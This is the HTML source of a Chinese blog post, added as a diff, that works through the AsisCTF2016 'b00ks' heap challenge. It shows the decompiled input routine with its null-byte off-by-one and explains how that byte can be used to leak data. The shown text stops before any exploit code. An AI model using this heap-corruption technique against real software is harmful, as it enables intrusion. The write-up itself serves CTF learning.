@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.119.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="LittFlower." />
+  <meta property="og:url" content="http://littflower.github.io/posts/asisctf2016-b00ks/" />
+  <link rel="canonical" href="http://littflower.github.io/posts/asisctf2016-b00ks/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/littflower.github.io"
+      },
+      "articleSection" : "posts",
+      "name" : "AsisCTF2016 b00ks 复现笔记",
+      "headline" : "AsisCTF2016 b00ks 复现笔记",
+      "description" : "记一道 offbyone 堆题的复现、反思与总结 复现 题目介绍 题目链接\n菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id\/name\/description\/author, delete 功能会 free 掉 book name\/book description\/book self ：\n1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit 题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。\nbook struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：\nstruct book { int id; char *name; char *description; int size; } book list 则是用来存放 book 的数组，主要用在 delete a book 和 edit a book 功能中。",
+      "inLanguage" : "en-US",
+      "author" : "LittFlower.",
+      "creator" : "LittFlower.",
+      "publisher": "LittFlower.",
+      "accountablePerson" : "LittFlower.",
+      "copyrightHolder" : "LittFlower.",
+      "copyrightYear" : "2024",
+      "datePublished": "2024-01-23 00:25:35 \u002b0800 CST",
+      "dateModified" : "2024-01-23 00:25:35 \u002b0800 CST",
+      "url" : "http:\/\/littflower.github.io\/posts\/asisctf2016-b00ks\/",
+      "keywords" : [ "pwn","堆溢出","offbyone", ]
+  }
+</script>
+<title>AsisCTF2016 b00ks 复现笔记</title>
+  <meta property="og:title" content="AsisCTF2016 b00ks 复现笔记" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="记一道 offbyone 堆题的复现、反思与总结 复现 题目介绍 题目链接
+菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id/name/description/author, delete 功能会 free 掉 book name/book description/book self ：
+1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit 题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。
+book struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：
+struct book { int id; char *name; char *description; int size; } book list 则是用来存放 book 的数组，主要用在 delete a book 和 edit a book 功能中。" />
+  <meta name="description" content="记一道 offbyone 堆题的复现、反思与总结 复现 题目介绍 题目链接
+菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id/name/description/author, delete 功能会 free 掉 book name/book description/book self ：
+1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit 题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。
+book struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：
+struct book { int id; char *name; char *description; int size; } book list 则是用来存放 book 的数组，主要用在 delete a book 和 edit a book 功能中。" />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:sarasa-fixed-sc,sans-serif;-webkit-font-smoothing:antialiased;src:url(https://cdn.jsdelivr.net/npm/firacode@6.2.0/distr/ttf/FiraCode-Light.ttf)format('ttf');margin:0 20px}article{max-width:1100px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:700;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:17.5px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#4005f3}.markdown-body blockquote{margin:0;padding:0 1em;color:#494d53;border-left:.25em solid #0b79e7}.markdown-body pre{padding:12px;overflow:auto;border-radius:10px}.markdown-body code{padding:.1em 0;font-size:100%;background-color:#eef1f3;border-radius:6px}.markdown-body pre>code{padding:0;font-size:95%;background-color:inherit;border:0}.markdown-body pre{background-color:#272822}.hljs{font-size:17.2px;color:#eef1f3}ul,ol{margin:.25em 0;line-height:1.6}ul ul,ul ol,ol ul,ol ol{margin:.25em 0}li{padding:.25em 0}h1{font-size:1.83rem}h2{font-size:1.74rem}h3{font-size:1.45rem}h4{font-size:1.28rem}h5{font-size:1.16rem}h6{font-size:1.21rem}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:source code pro,sans-serif;src:url(https://cdn.jsdelivr.net/npm/source-code-pro@2.38.0/WOFF/TTF/SourceCodePro-Bold.ttf.woff)format("woff")}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:700}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}:root{--nav-width:1380px;--article-width:650px;--toc-width:300px}.toc{margin:0 2px 40px;border:1px solid var(--border);background:var(--entry);border-radius:var(--radius);padding:.4em}.toc-container.wide{position:absolute;height:100%;border-right:1px solid var(--border);left:calc((var(--toc-width) + var(--gap)) * -1);top:calc(var(--gap) * 2);width:var(--toc-width)}.wide .toc{position:sticky;top:var(--gap);border:unset;background:unset;border-radius:unset;width:100%;margin:0 2px 40px}.toc details summary{cursor:zoom-in;margin-inline-start:20px;padding:12px 0}.toc details[open] summary{font-weight:500}.toc-container.wide .toc .inner{margin:0}.active{font-size:110%;font-weight:600}.toc ul{list-style-type:circle}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;font-size:16px;max-height:83vh;overflow-y:auto}.toc .inner::-webkit-scrollbar-thumb{background:var(--border);border:7px solid var(--theme);border-radius:var(--radius)}.toc li ul{margin-inline-start:calc(var(--gap) * .5);list-style-type:none}.toc li{list-style:none;font-size:.95rem;padding-bottom:5px}.toc li a:hover{color:var(--secondary)}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="一只花盆.">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >小花ฅ.</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/aboutme" target="_blank">AboutMe</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/LittFlower" target="_blank">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/friends" target="_blank">Friends</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">AsisCTF2016 b00ks 复现笔记</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2024-01-23 00:25:35 CST">
+                23 Jan 2024
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://blog.littflower.top">@LittFlower.</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="记一道-offbyone-堆题的复现反思与总结">记一道 offbyone 堆题的复现、反思与总结</h1>
+<h2 id="复现">复现</h2>
+<h3 id="题目介绍">题目介绍</h3>
+<p><a href="https://buuoj.cn/challenges#asis2016_b00ks">题目链接</a></p>
+<p>菜单题，选单如下，其中 create 功能会创建一个 book，edit 功能只能修改 book 的 description，print 功能会打印 book 的 id/name/description/author, delete 功能会 free 掉 book name/book description/book self ：</p>
+<pre tabindex="0"><code>1. Create a book
+2. Delete a book
+3. Edit a book
+4. Print book detail
+5. Change current author name
+6. Exit
+</code></pre><p>题目每创建一个 book，会涉及到两个用于维护的数据结构：一个是 book struct 本身，一个是 book list。</p>
+<p>book struct 结构如下，每个 book struct 耗用内存空间大小为 0x20：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> book {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> id;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>description;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> size;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>book list 则是用来存放 book 的数组，主要用在 <code>delete a book</code> 和 <code>edit a book</code> 功能中。</p>
+<p>注意到程序自己实现了一个输入函数 <code>input</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">input</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>target, <span style="color:#66d9ef">int</span> len)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( len <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, target, <span style="color:#ae81ff">1uLL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>target <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>target;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">==</span> len )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>以及它的一个引用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">read_author</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter author name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">input</span>(author, <span style="color:#ae81ff">32LL</span>) )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;fail to read author_name&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>注意一下：这个 <code>input</code> 函数的逻辑是，先读入一个字符，数组下标加一，检查已读入字符的长度，如果未达到 <code>len</code>，则继续读入；如果读入换行符，则退出循环并将换行符所在的位置置为 0。</p>
+<p>因此，如果当 <code>input(author, 32LL)</code>，会触发一个 off by one 漏洞：假设输入 <code>&quot;a&quot; * 32 + '\n'</code> 时，<code>input</code>函数一定会将 <code>target[32]</code> （ target 0 ~ 31 是共计 32 个 &lsquo;a&rsquo;）置为 <code>\x00</code>。</p>
+<p>这是 off by one in heap 的一个常见漏洞，即利用 Null byte 进行攻击。</p>
+<p>这个题目附件的保护除了 canary 是开满的，我们需要利用 Null byte off by one 泄漏一些东西。</p>
+<p>继续看，注意到 <code>create</code> 函数里会将创建好的 book struct 放在 book list 里：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( b ) {
+</span></span><span style="display:flex;"><span>    b<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> size;                     <span style="color:#75715e">// book name size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(pos <span style="color:#f92672">+</span> v2) <span style="color:#f92672">=</span> b;
+</span></span><span style="display:flex;"><span>    b<span style="color:#f92672">-&gt;</span>description <span style="color:#f92672">=</span> ptr2;              <span style="color:#75715e">// book description
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    b<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> ptr;                      <span style="color:#75715e">// book name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    b<span style="color:#f92672">-&gt;</span>id <span style="color:#f92672">=</span> <span style="color:#f92672">++</span>id;                       <span style="color:#75715e">// book id
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>}
